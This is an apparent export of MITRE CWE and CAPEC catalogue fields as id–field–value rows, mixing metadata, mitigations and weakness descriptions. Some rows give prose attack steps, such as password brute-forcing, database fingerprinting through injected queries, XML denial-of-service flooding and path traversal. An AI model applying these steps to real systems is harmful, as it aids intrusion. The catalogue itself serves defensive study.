21990	39	2011-06-27
8209	62	updated Related_Attack_Patterns
8890	81	Availability
19895	50	Implementation: Host integrity monitoring
7294	63	Execute Unauthorized Code or Commands
18738	81	Other
7816	28	CWE Content Team
18663	100	The MITRE Corporation
23717	50	Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.
24537	45	Base
16383	28	CWE Content Team
20212	62	updated Time_of_Introduction
7938	51	2014-06-23
22901	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)                            Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Attack Modeling
7726	33	klog
9936	77	Manual Static Analysis
6238	62	updated Potential_Mitigations, Related_Attack_Patterns
22860	73	Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the attacker observes the system calls and API calls that are made by the target system, and the nature of their parameters.
14329	35	MITRE
14727	62	updated Modes_of_Introduction, Relationships, Taxonomy_Mappings
6382	56	ChildOf
12018	35	MITRE
22786	45	Base
9399	39	2010-06-21
9193	59	Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit
19553	26	Implementation
13164	40	The attacker must have previously compromised the victim's systems or have physical access to the victim's systems.
22872	56	ChildOf
12173	44	High
9890	77	Architecture or Design Review
23168	104	39
9032	35	MITRE
22223	39	2009-03-10
10926	35	MITRE
21751	28	Eric Dalci
19202	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
19095	35	MITRE
10982	21	PLOVER
5901	79	Availability
18421	92	Experiment
18365	92	Experiment
13033	44	SOAR Partial
7977	39	2012-05-11
17091	21	CWE Content Team
12755	21	PLOVER
11779	42	Developers should anticipate that special elements (e.g. delimiters, symbols) will be injected into input vectors of their software system. One defense is to create a whitelist (e.g. a regular expression) that defines valid input according to the requirements specifications. Strictly filter any input that does not match against the whitelist. Properly encode your output, and quote any elements that have special meaning to the component with which you are communicating.
18252	42	Use a PRNG that periodically re-seeds itself using input from high-quality sources, such as hardware devices with high entropy. However, do not re-seed too frequently, or else the entropy source might block.
20271	62	updated Relationships, Taxonomy_Mappings
11216	34	Programmers may try to index from a pointer by adding a number of bytes. This is incorrect because C and C++ implicitly scale the operand by the size of the data type.
22060	63	Execute Unauthorized Code or Commands
6785	46	Depending on the locking functionality, an unlock of a non-locked resource might cause memory corruption or other modification to the resource (or its associated metadata that is used for tracking locks).
12551	43	Simple
18983	101	CAPEC Content Team
19481	35	MITRE
9244	101	CAPEC Content Team
8779	35	KDM Analytics
23071	91	Operation
8190	39	2012-10-30
6148	87	Database Server
16396	100	The MITRE Corporation
21167	81	Access Control
24667	103	Primary
19743	42	Make sure to prevent serialization of your objects.
22328	50	The server must initiate the handshake by issuing the challenge. This ensures that the client has to respond before the exchange can move any further
10430	39	2008-10-14
9278	28	CWE Content Team
8324	39	2011-06-01
10914	81	Availability
20549	100	The MITRE Corporation
22010	62	updated Relationships
12335	39	2017-01-19
10532	35	MITRE
10355	35	MITRE
6653	28	CWE Content Team
19391	66	Preventing XSS with Correct Output Encoding
7339	86	http://blogs.msdn.com/sdl/archive/2008/05/15/giving-sql-injection-the-respect-it-deserves.aspx
21909	92	Explore
14661	62	updated Demonstrative_Examples
8621	28	CWE Content Team
22043	88	Direct Request ('Forced Browsing')
23837	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Methods_of_Attack, Related_Attack_Patterns, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
24164	28	CWE Content Team
9716	79	Confidentiality
13468	39	2008-09-08
8853	35	MITRE
11718	23	The behavior of this function is undefined unless its control parameter is set to a specific value.
21537	35	MITRE
18954	74	2
22811	62	updated Common_Consequences
15612	28	Eric Dalci
5855	62	added/updated demonstrative examples
16142	103	Primary
10990	39	2017-11-08
20659	42	Do not store sensitive information in include files.
10591	91	Implementation
9687	46	Security mechanisms should be as simple as possible. Complex security mechanisms may engender partial implementations and compatibility problems, with resulting mismatches in assumptions and implemented security. A corollary of this principle is that data specifications should be as simple as possible, because complex data specifications result in complex validation code. Complex tasks and systems may also need to be guarded by complex security checks, so simple systems should be preferred.
6839	28	CWE Content Team
20814	50	While copying and pasting of data with the clipboard is a legitimate and practical function, certain situations and context may require the disabling of this feature. Just as certain applications disable screenshot capability, applications that handle highly sensitive information should consider disabling copy and paste functionality.
15276	94	The attacker's goal is to prevent users from accessing the cellular network. Denying connectivity to the cellular network prevents the user from being able to transmit or receive any data, which also prevents VOIP calls, however this attack poses no threat to data confidentiality.
15015	39	2008-09-08
20948	62	Integrated mitigations and detection methods for Certificate Pinning based on feedback from the CWE Researcher List in December 2017.
16551	62	updated References, Related_Attack_Patterns, Relationships
15950	103	Primary
13023	104	939
13264	39	2010-12-13
21221	92	Experiment
8440	62	updated Relationships, Taxonomy_Mappings
15252	62	updated Description
13340	95	[Redirect users to malicious website] As the adversary succeeds in exploiting the vulnerability, the victim connects to a malicious site using a good web site's domain name.
7356	30	David Wagner
15392	42	Ensure that certificates are checked for revoked status before each use of a protected resource. If the certificate is checked before each access of a protected resource, the delay subject to a possible race condition becomes almost negligible and significantly reduces the risk associated with this issue.
10784	100	The MITRE Corporation
5827	35	MITRE
22013	89	Detailed
11091	43	Simple
15988	103	Primary
8372	62	updated Taxonomy_Mappings
13789	35	MITRE
8866	23	An attacker undermines the integrity of a product, software, or technology at some stage of the distribution channel. The core threat of modification or manipulation during distribution arise from the many stages of distribution, as a product may traverse multiple suppliers and integrators as the final asset is delivered. Components and services provided from a manufacturer to a supplier may be tampered with during integration or packaging.
23377	47	Other
21832	31	1003
18920	42	When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.
24412	35	MITRE
14275	62	updated Potential_Mitigations, Time_of_Introduction
24912	80	The adversary has only to try IP address format combinations.
11765	39	2009-12-28
7883	35	MITRE
12578	62	updated Name
16338	28	CWE Content Team
12079	28	CWE Content Team
9706	28	CWE Content Team
21716	54	Medium
22715	28	CWE Content Team
11701	35	MITRE
15927	31	1000
11494	39	2008-09-08
13610	35	MITRE
14013	103	Primary
24146	91	Requirements
16099	51	2018-07-31
6329	81	Availability
24546	28	CWE Content Team
14729	39	2011-06-01
11314	49	2012
13404	76	2017-08-04
24827	35	MITRE
19837	31	1000
13689	28	CWE Content Team
7845	105	Mobile
6939	28	CWE Content Team
14952	31	1000
23922	35	MITRE
23654	39	2012-05-11
22633	35	MITRE
11768	56	ChildOf
23596	62	updated Taxonomy_Mappings
10558	39	2009-05-27
13468	35	MITRE
21637	43	Simple
18614	79	Confidentiality
25113	73	Gain access to application's source code to determine log file formats.
9789	26	Implementation
7126	79	Confidentiality
21270	62	updated Relationships
17733	89	Standard
14323	48	01
23191	92	Explore
19249	30	David Wheeler
6684	39	2012-10-30
23783	79	Availability
6976	62	updated Description, Name
12928	43	Simple
9361	91	Implementation
11916	62	updated Observed_Examples, Potential_Mitigations
6009	35	MITRE
6761	28	CWE Content Team
6505	24	MITRE
16886	56	ChildOf
18640	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
10463	50	None are known.
23879	39	2008-07-01
12139	56	ChildOf
7307	33	Coda Hale
9417	46	If access to a shared resource is not synchronized, then the resource may not be in a state that is expected by the software. This might lead to unexpected or insecure behaviors, especially if an attacker can influence the shared resource.
9847	28	CWE Content Team
8238	33	David Litchfield
15796	28	CWE Content Team
11340	39	2008-07-01
8881	76	2017-08-04
17472	51	2014-06-23
12301	47	Gain Privileges
8537	35	MITRE
8533	73	These can be found via Powershell or LDAP queries, as well as enumerating startup name accounts and other means.
15525	47	Read Data
11560	35	MITRE
7111	56	ChildOf
7398	55	CAPEC Content Team
18096	23	A parent class has a virtual destructor method, but the parent has a child class that does not have a virtual destructor.
22559	35	MITRE
9589	94	Attacks that leverage the principle of scarcity can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.
9211	102	CanFollow
6289	28	CWE Content Team
22363	56	ChildOf
9435	46	While sometimes intentional and safe, when the same function is used to handle multiple signals, a race condition could occur if the function uses any state outside of its local declaration, such as global variables or non-reentrant functions, or has any side effects.             An attacker could send one signal that invokes the handler function; in many OSes, this will typically prevent the same signal from invoking the handler again, at least until the handler function has completed execution. However, the attacker could then send a different signal that is associated with the same handler function. This could interrupt the original handler function while it is still executing. If there is shared state, then the state could be corrupted. This can lead to a variety of potential consequences depending on context, including denial of service and code execution.             Another rarely-explored possibility arises when the signal handler is only designed to be executed once (if at all). By sending multiple signals, an attacker could invoke the function more than once. This may generate extra, unintended side effects. A race condition might not even be necessary; the attacker could send one signal, wait until it is handled, then send the other signal.
19930	76	2017-08-04
16565	59	Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Related_Weaknesses, Resources_Required
12403	40	Knowledge of the target device's or application’s vulnerabilities that can be capitalized on with malicious code. The adversary must be able to place the malicious code on the target device.
11396	81	Access Control
15832	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
16153	69	Incomplete
22901	44	High
9501	76	2019-09-30
11929	35	MITRE
21024	35	MITRE
17656	39	2017-11-08
6281	85	227
23091	46	A common example of this weakness occurs when the code inadvertently extracts the reference to an object, instead of its relevant contents.
18218	23	The software locks a critical resource more times than intended, leading to an unexpected state in the system.
21396	94	The adversary is able to gather information to potentially support further nefarious activities.
18982	79	Confidentiality
10864	34	Setting manipulation vulnerabilities occur when an attacker can control values that govern the behavior of the system, manage specific resources, or in some way affect the functionality of the application.
17684	25	Medium
17109	62	updated Relationships, Relationship_Notes, Taxonomy_Mappings
5907	28	CWE Content Team
8530	39	2017-11-08
10411	31	1000
9546	96	2012-12-21
20412	50	Implementation: Session tokens for specific host
20507	39	2008-09-08
5840	56	ChildOf
25111	28	CWE Content Team
12672	30	Halvar Flake
12474	39	2014-07-30
25282	62	updated Relationships, Taxonomy_Mappings
12144	35	MITRE
17744	56	ChildOf
20710	62	updated Observed_Examples
21858	30	Hao Hao
13800	55	CAPEC Content Team
19503	28	CWE Content Team
20893	51	2014-06-23
16591	52	This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
15223	35	MITRE
9905	35	MITRE
8340	23	The adversary takes advantage of a bug in an application failing to verify the integrity of the running process to execute arbitrary code in the address space of a separate live process. The adversary could use running code in the context of another process to try to access process's memory, system/network resources, etc. The goal of this attack is to evade detection defenses and escalate privileges by masking the malicious code under an existing legitimate process. Examples of approaches include but not limited to: dynamic-link library (DLL) injection, portable executable injection, thread execution hijacking, ptrace system calls, VDSO hijacking, and more.
8311	28	David Remahl
20812	35	MITRE
9702	62	updated Potential_Mitigations
20566	103	Primary
5950	81	Access Control
23410	56	ChildOf
7436	54	High
20751	47	Read Data
18792	62	updated Causal_Nature, Observed_Examples, Relationships, Taxonomy_Mappings, White_Box_Definitions
22187	57	Indirect
21146	28	CWE Content Team
23689	90	Language-Independent
6466	39	2018-03-27
18656	26	Implementation
14773	28	CWE Content Team
12298	51	2015-11-09
21808	42	Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict all access to files within a particular directory.                   Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection.                   This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.                   Be careful to avoid CWE-243 and other weaknesses related to jails.
21019	89	Detailed
14938	42	An application must, at all times, keep track of network resources and meter their usage appropriately.
17763	62	updated Relationships
24025	91	Testing
7404	42	The regular expression feature in some languages allows inputs to be quoted or escaped before insertion, such as \Q and \E in Perl.
20430	39	2009-10-29
17047	28	CWE Content Team
21464	79	Access Control
8024	95	[Brute force password] Given the finite space of possible passwords dictated by the password policy determined in the previous step, try all possible passwords for a known user ID until application/system grants access.
16405	35	MITRE
7312	48	09
14710	35	MITRE
11134	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
20222	69	Incomplete
12335	62	updated Relationships
22391	103	Primary
10883	103	Primary
17884	71	2003
21965	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
25369	87	Web Server
20175	35	MITRE
12357	104	347
23864	25	Low
19672	56	ChildOf
17029	56	ChildOf
19296	62	updated Potential_Mitigations
23655	23	An adversary exploits a few properties of XML(substitution entities and inline DTDs) to cause a denial of service situation due to excessive memory being allocated to fully expand the XML. The result of this denial of service could cause the application to freeze or crash.
21646	58	Mobile code, such as a Java Applet, is code that is transmitted across a network and executed on a remote machine. Because mobile code developers have little if any control of the environment in which their code will execute, special security concerns become relevant. One of the biggest environmental threats results from the risk that the mobile code will run side-by-side with other, potentially malicious, mobile code. Because all of the popular web browsers execute code from multiple sources together in the same JVM, many of the security guidelines for mobile code are focused on preventing manipulation of your objects' state and behavior by adversaries who have access to the same virtual machine where your program is running.
14341	101	CAPEC Content Team
7578	78	High
9650	35	MITRE
11411	35	MITRE
8812	62	updated Background_Details, Relationships, Taxonomy_Mappings
10923	62	updated Relationships
23060	39	2011-03-29
13931	28	CWE Content Team
24452	39	2008-10-14
12382	80	It is relatively straightforward to identify an HTTP Get method that changes state on the server side and executes against an over-privileged system interface
22470	62	updated Relationships
13366	39	2008-07-01
21840	91	Architecture and Design
13886	28	CWE Content Team
20839	102	ChildOf
10168	62	updated Relationships
8206	26	Implementation
20049	104	397
10930	39	2011-06-27
14625	35	MITRE
6608	40	The adversary needs either physical or remote access to the victim system.
9841	85	104
25202	31	1000
9346	40	The targeted program accepts input data from the user or from another program.
15061	26	Architecture and Design
18829	35	Cigital
5865	78	Medium
23005	59	Updated Description Summary, Other_Notes, References, Related_Attack_Patterns, Resources_Required
22012	81	Integrity
19184	76	2019-09-30
23067	28	CWE Content Team
14353	35	MITRE
12955	28	CWE Content Team
21184	39	2010-02-16
13398	62	updated Description, Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings
22605	35	Cigital
7395	79	Availability
20275	31	699
24656	42	When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.
24486	62	updated Detection_Factors, Relationships
18717	72	When authorization, authentication, or another protection mechanism relies on CAPTCHA entities to ensure that only human actors can access certain functionality, then an automated attacker such as a bot may access the restricted functionality by guessing the CAPTCHA.
22625	62	updated Common_Consequences, Likelihood_of_Exploit, Other_Notes, Potential_Mitigations, Relationship_Notes, Relationships, Weakness_Ordinalities
7965	73	Hide action controls over very psychologically tempting content.
17644	51	2014-06-23
7391	28	CWE Content Team
24913	42	Use spyware detection and removal software.
9366	100	The MITRE Corporation
12129	62	updated Applicable_Platforms, Description, Other_Notes, Potential_Mitigations, Relationships
14908	35	MITRE
6683	62	updated Potential_Mitigations
20412	78	High
7512	23	The software uses a dedicated, central data manager component as required by design, but it contains code that performs data-access operations that do not use this data manager.
16816	35	MITRE
17458	79	Confidentiality
6123	90	PHP
13914	35	MITRE
24669	44	High
5720	39	2011-09-13
8530	62	updated Applicable_Platforms, Demonstrative_Examples, Description, Modes_of_Introduction, Name, References, Relationships
19270	56	ChildOf
13439	73	For any services found, use error messages from poorly formed service calls to determine valid interfaces. In some cases, services will respond to poorly formed calls with valid ones.
17492	28	CWE Content Team
18419	35	MITRE
6295	103	Primary
19115	100	The MITRE Corporation
9268	26	Implementation
18955	23	The application uses a cache to maintain a pool of objects, threads, connections, pages, or passwords to minimize the time it takes to access them or the resources to which they connect. If implemented improperly, these caches can allow access to unauthorized information or cause a denial of service vulnerability.
10221	28	CWE Content Team
23860	39	2008-07-01
14101	45	Base
12442	26	Implementation
23711	39	2012-10-30
15903	104	108
10990	35	MITRE
23124	81	Integrity
20836	39	2008-09-08
12713	43	Simple
22913	31	1000
21551	90	Language-Independent
6023	30	Robert Auger
15272	35	MITRE
8395	62	updated Common_Consequences
20492	73	Lure the victim to the malicious site by sending the victim an e-mail with a URL to the site.
23628	23	The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.
24099	39	2012-05-11
14788	28	CWE Content Team
7066	28	CWE Content Team
7785	86	http://msdn.microsoft.com/en-us/library/ms647466.aspx
6636	66	Top 25 Series - Rank 22 - Allocation of Resources Without Limits or Throttling
20367	31	699
6302	35	MITRE
17820	63	Modify Application Data
15930	43	Simple
10363	101	CAPEC Content Team
11841	62	updated Relationships
22597	68	This is not a complete solution. However, it forces the attacker to guess an unknown value that changes every program execution. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.
18443	28	CWE Content Team
8962	79	Integrity
21370	35	MITRE
19538	43	Simple
8645	28	CWE Content Team
13472	24	MITRE
19078	87	Web Server
22043	45	Base
9151	39	2018-03-27
12972	104	512
13549	76	2019-04-04
7346	35	MITRE
18874	62	updated Relationships
11342	86	https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/348.html
23980	31	1000
21038	35	MITRE
14834	39	2012-10-30
12347	21	Landwehr
9098	28	CWE Content Team
14155	43	Simple
9826	28	CWE Content Team
9481	72	Just as it may be possible to read sensitive information, it is also possible to make changes or even delete this information with a SQL injection attack.
21521	91	Implementation
22081	28	Eric Dalci
24125	35	Cigital
14800	35	Veracode
24292	47	Gain Privileges
7487	26	Implementation
16564	96	2019-03-25
17562	50	Employ robust identification and audit/blocking via whitelisting of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.
23412	62	updated Potential_Mitigations
14748	31	1000
10381	93	Defense in Depth
14494	35	MITRE
11942	88	Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')
18233	71	1981
25207	35	MITRE
16352	35	MITRE
16326	69	Incomplete
16373	35	MITRE
9193	100	The MITRE Corporation
10552	77	Manual Analysis
20568	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.
14025	91	Implementation
14739	81	Availability
10083	26	Architecture and Design
12360	104	238
18678	33	Giovanni Vigna
24190	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships, Taxonomy_Mappings, White_Box_Definitions
11662	43	Simple
24330	101	CAPEC Content Team
12152	35	MITRE
12473	39	2011-06-27
16633	88	Small Seed Space in PRNG
20787	31	1000
13511	62	updated Relationships, Taxonomy_Mappings
11061	91	Implementation
12202	23	An adversary engages in UDP scanning to gather information about UDP port status on the target system. UDP scanning methods involve sending a UDP datagram to the target port and looking for evidence that the port is closed. Open UDP ports usually do not respond to UDP datagrams as there is no stateful mechanism within the protocol that requires building or establishing a session. Responses to UDP datagrams are therefore application specific and cannot be relied upon as a method of detecting an open port. UDP scanning relies heavily upon ICMP diagnostic messages in order to determine the status of a remote port. During a UDP scan, a datagram is sent to a target port. If an 'ICMP Type 3 Port unreachable' error message is returned then the port is considered closed. Different types of ICMP messages can indicate a filtered port. UDP scanning is slower than TCP scanning. The protocol characteristics of UDP make port scanning inherently more difficult than with TCP, as well as dependent upon ICMP for accurate scanning. Due to ambiguities that can arise between open ports and filtered ports, UDP scanning results often require a high degree of interpretation and further testing to refine. In general, UDP scanning results are less reliable or accurate than TCP-based scanning.
12159	21	PLOVER
24482	39	2008-07-01
20014	47	Unreliable Execution
22551	26	Implementation
8760	39	2008-07-01
12125	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
15576	35	MITRE
20132	21	David Deatherage
24361	39	2011-06-01
13113	39	2008-10-14
21694	22	11
14718	31	699
20928	62	updated Common_Consequences
6973	23	The product behaves differently or sends different responses in a way that exposes security-relevant information about the state of the product, such as whether a particular operation was successful or not.
14181	62	updated Detection_Factors, Potential_Mitigations
14201	76	2017-08-04
21772	91	Architecture and Design
21026	51	2014-06-23
20369	103	Primary
18186	28	CWE Content Team
10650	62	updated Relationships, Taxonomy_Mappings
7639	80	Sophisticated attack, but detailed techniques published in the open literature.
12143	39	2014-07-30
13749	47	Gain Privileges
23193	39	2011-09-13
24477	39	2008-07-01
18439	68	This is not a complete solution. However, it forces the attacker to guess an unknown value that changes every program execution. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.
19446	28	CWE Content Team
14051	39	2014-06-23
13685	76	2019-04-04
18330	39	2008-09-08
14056	23	An adversary injects one or more TCP RST packets to a target after the target has made a HTTP GET request. The goal of this attack is to have the target and/or destination web server terminate the TCP connection.
23705	28	CWE Content Team
20588	43	Simple
8183	35	Cigital
13003	59	Updated References
23288	26	Implementation
18340	73	Attackers can establish rogue proxy servers for network protocols that give out the session ID and then redirect the connection to the legitimate service.
24506	62	updated Common_Consequences
7711	42	Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.
14557	23	This OS fingerprinting probe sends a number of TCP SYN packets to an open port of a remote machine. The Initial Sequence Number (ISN) in each of the SYN/ACK response packets is analyzed to determine the smallest number that the target host uses when incrementing sequence numbers. This information can be useful for identifying an operating system because particular operating systems and versions increment sequence numbers using different values. The result of the analysis is then compared against a database of OS behaviors to determine the OS type and/or version.
13875	40	The attacker must be able to manipulate the targeted integer variable such that normal operations result in non-standard values due to the storage structure of integers.
19691	100	The MITRE Corporation
17084	62	updated Potential_Mitigations, Time_of_Introduction
18433	31	699
13795	62	updated Related_Attack_Patterns, Relationships
21503	56	ChildOf
17777	35	MITRE
10610	35	MITRE
14088	91	Implementation
16245	56	PeerOf
5617	39	2008-11-24
9806	56	ChildOf
17336	39	2008-09-08
21551	104	250
24225	56	ChildOf
17926	55	CAPEC Content Team
11316	45	Class
22653	39	2017-11-08
25052	62	updated Potential_Mitigations
7005	39	2009-01-12
9244	59	Updated Related_Attack_Patterns
12569	62	updated Other_Notes
19568	62	updated Potential_Mitigations, References
15324	86	https://ibreak.software/cross-site-port-attacks-xspa-part-3/
23398	62	updated Potential_Mitigations
7492	28	CWE Content Team
17819	62	updated Time_of_Introduction
20316	39	2012-05-11
22711	62	updated Background_Details, Causal_Nature, Likelihood_of_Exploit, References, Relationships, Taxonomy_Mappings, White_Box_Definitions
11324	47	Read Data
24674	39	2014-07-30
8168	35	MITRE
13519	40	This type of an attack requires the ability to identify hosts running a poorly implemented Regex, and the ability to send crafted input to exploit the regular expression.
15941	72	The most common result of resource exhaustion is denial of service. The software may slow down, crash due to unhandled errors, or lock out legitimate users.
18191	32	Google Inc.
14400	39	2017-11-08
10828	26	Architecture and Design
22210	39	2010-12-13
23789	35	MITRE
20891	90	Language-Independent
25217	28	CWE Content Team
8568	95	[Determine database type] Determines the type of the database, such as MS SQL Server or Oracle or MySQL, using logical conditions as part of the injected queries
8513	81	Other
14567	35	MITRE
7820	43	Simple
18711	62	updated Other_Notes, Relationship_Notes
21972	103	Primary
23731	21	PLOVER
21671	35	MITRE
17360	31	699
20083	59	Updated Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Attack_Patterns, Typical_Likelihood_of_Exploit
19593	103	Primary
10483	102	ChildOf
9751	62	updated Taxonomy_Mappings
22995	62	updated Relationships, Taxonomy_Mappings
24760	80	A more sophisticated attack can try to defeat the input validation mechanism.
17443	39	2014-07-30
15197	56	ChildOf
19292	28	CWE Content Team
24066	69	Draft
8919	59	Updated Related_Weaknesses
22439	39	2011-06-27
12769	104	666
24062	35	MITRE
5919	91	Implementation
11744	39	2019-06-20
20066	54	High
24335	28	CWE Content Team
10920	42	Use a PRNG that periodically re-seeds itself using input from high-quality sources, such as hardware devices with high entropy. However, do not re-seed too frequently, or else the entropy source might block.
12682	102	ChildOf
11720	35	MITRE
17695	28	CWE Content Team
12696	28	CWE Content Team
22606	28	CWE Content Team
24776	35	MITRE
8997	89	Detailed
17956	63	Modify Memory
22138	86	http://java.sun.com/j2se/1.5.0/docs/api/java/util/concurrent/locks/ReentrantLock.html
18107	62	updated Relationships, Taxonomy_Mappings
24048	31	699
14124	45	Class
16520	55	CAPEC Content Team
17393	35	MITRE
19502	28	Eric Dalci
10599	103	Primary
15042	50	Design: Generate and validate MAC for cookies
19952	46	This issue can make it more difficult to understand and maintain the code.  It can make it more difficult and time-consuming to detect and/or fix vulnerabilities.
6912	97	Signature Spoofing by Improper Validation
7333	62	updated Potential_Mitigations
15201	28	CWE Content Team
12545	74	1
10877	28	CWE Content Team
18610	84	20
13437	81	Availability
10158	56	ChildOf
22363	31	699
24809	73	Manually attempt calls to the service using an educated guess approach, including the use of terms like' 'test', 'debug', 'delete', etc.
23131	39	2018-03-27
14582	103	Primary
11751	28	CWE Content Team
17978	44	High
9145	62	updated Time_of_Introduction
15078	62	updated Relationships
15169	35	MITRE
13028	92	Explore
8162	35	MITRE
24151	31	1000
11239	35	MITRE
22351	21	Landwehr
14293	56	ChildOf
15375	31	700
7956	51	2014-06-23
13682	28	CWE Content Team
25122	79	Authorization
20393	28	CWE Content Team
23741	70	The OWASP Application Security Desk Reference
7158	39	2008-07-01
19804	39	2011-06-01
21586	23	An attacker, leveraging the ability to manipulate components of primary support systems and tools within the development and production environments, inserts malicious software within the hardware and/or firmware development environment. The infiltration purpose is to alter developed hardware components in a system destined for deployment at the victim's organization, for the purpose of disruption or further compromise.
10397	103	Primary
19354	102	ChildOf
20394	46	Because the information is stored in cleartext, attackers could potentially read it. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.
20548	104	421
8911	56	ChildOf
11950	62	updated Common_Consequences
20733	62	updated Detection_Factors
15858	35	MITRE
7795	39	2019-09-19
20371	35	MITRE
20366	63	Bypass Protection Mechanism
10239	77	Manual Static Analysis - Binary or Bytecode
21703	63	Bypass Protection Mechanism
16826	28	CWE Content Team
12974	28	CWE Content Team
19495	62	updated Relationships, Taxonomy_Mappings
15092	35	MITRE
9680	73	Spidering web sites for all available links
17457	69	Draft
23806	62	updated White_Box_Definitions
22655	95	[View unauthorized data] The attacker discovers and views unprotected sensitive data.
5754	46	While error messages in and of themselves are not dangerous, per se, it is what an attacker can glean from them that might cause eventual problems.
18311	39	2019-01-03
9257	95	[Launch a resource depletion attack] The attacker delivers a large number of XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.
7577	28	CWE Content Team
18746	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
13220	97	Alternative Execution Due to Deceptive Filenames
25190	59	Updated Related_Weaknesses
11358	39	2010-12-13
9650	39	2011-06-01
21401	47	Execute Unauthorized Commands
16538	101	CAPEC Content Team
13612	92	Explore
22022	47	Modify Data
20061	39	2011-03-29
14131	28	CWE Content Team
25281	39	2017-05-03
15382	39	2014-07-30
12394	42	If the software must contain hard-coded credentials or they cannot be removed, perform access control checks and limit which entities can access the feature that requires the hard-coded credentials. For example, a feature might only be enabled through the system console instead of through a network connection.
14613	39	2019-06-20
8115	85	287
17469	91	Build and Compilation
18753	53	The MITRE Corporation
14674	35	MITRE
8071	28	CWE Content Team
8366	59	Updated Related_Attack_Patterns
15699	40	The targeted web application does not fully normalize input before checking for prohibited syntax. In particular, it must fail to recognize prohibited methods preceded by certain sequences of repeated characters.
12972	88	Spyware
23045	35	MITRE
20483	39	2011-06-01
7900	35	MITRE
22830	56	CanPrecede
10919	28	CWE Content Team
23066	61	Stable
17613	39	2012-05-11
7563	39	2011-06-01
21590	104	192
19517	21	CWE Content Team
25141	35	MITRE
12914	76	2015-11-09
10641	39	2017-11-08
13019	35	MITRE
15803	31	1000
23066	85	117
22114	102	ChildOf
12837	101	CAPEC Content Team
19763	69	Incomplete
23131	28	CWE Content Team
19018	50	Implementation: For applications that use a known schema, use a local copy or a known good repository instead of the schema reference supplied in the XML document. Additionally, ensure that the proper permissions are set on local files to avoid unauthorized modification.
23630	61	Stable
16165	85	402
8814	25	High
15604	103	Primary
7338	69	Draft
24504	103	Primary
7709	28	CWE Content Team
23321	28	CWE Content Team
21951	28	Eric Dalci
20460	102	ChildOf
13118	31	1000
12608	28	CWE Content Team
9535	79	Confidentiality
5924	28	CWE Content Team
22106	48	07
19631	35	MITRE
20747	35	MITRE
15233	101	CAPEC Content Team
20440	39	2019-01-03
23087	28	CWE Content Team
20604	49	2002
9823	39	2011-03-29
21014	79	Availability
14695	45	Base
8115	78	Low
23034	26	Architecture and Design
11936	62	updated Relationships
10872	39	2008-11-24
14480	28	Eric Dalci
14394	47	Execute Unauthorized Commands
6632	21	PLOVER
19872	50	Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.
19594	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
21692	97	Cross Frame Scripting (XFS)
18037	63	Other
19949	81	Availability
14403	101	CAPEC Content Team
16337	31	1000
18081	26	Implementation
9959	97	Host Discovery
17145	23	The software contains protection mechanisms to restrict access to 'realdir/filename', but it constructs pathnames using external input in the form of 'fakedir/../realdir/filename' that are not handled by those mechanisms. This allows attackers to perform unauthorized actions against the targeted file.
22226	80	Some fingerprinting activity requires very specific knowledge of how different operating systems respond to various TCP/IP requests. Application fingerprinting can be as easy as envoking the application with the correct command line argument, or mouse clicking in the appropriate place on the screen.
15968	31	1000
12327	56	ChildOf
17653	35	MITRE
10666	35	Cigital
6851	63	Unexpected State
23348	103	Primary
23784	76	2017-01-09
15114	39	2012-10-30
